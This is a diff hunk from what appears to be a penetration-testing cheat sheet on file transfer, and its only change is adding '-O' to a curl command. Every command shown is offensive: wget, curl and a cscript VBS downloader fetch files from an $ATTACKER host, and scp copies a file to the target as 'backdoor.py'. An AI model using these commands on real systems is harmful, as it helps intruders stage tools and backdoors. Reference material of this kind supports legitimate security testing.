@@ -241,7 +241,7 @@ cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
 ##### HTTP: Linux
 ```bash
 wget http://$ATTACKER/file
-curl http://$ATTACKER/file
+curl http://$ATTACKER/file -O
 scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 ```
 
